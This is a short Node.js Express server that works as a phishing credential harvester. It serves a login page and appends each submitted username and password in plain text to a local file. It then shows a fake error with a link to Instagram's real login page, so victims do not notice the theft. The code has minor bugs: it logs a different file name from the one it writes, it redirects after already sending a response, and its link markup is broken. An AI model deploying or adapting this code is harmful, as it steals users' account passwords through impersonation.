const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;
const path = require('path')

// Middleware to parse JSON and URL-encoded form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

// Handle the form submission and save data to users.txt
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const userData = { username, password };
    const userDataString = JSON.stringify(userData);

    fs.appendFile('users.json', userDataString + '\n', (err) => {
        if (err) throw err;
        console.log('Data saved to users.txt');
    });

    res.send(' Error Occured !!\n <a href="https://instagram.com/login"><Log in</a>');
    res.redirect('')
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
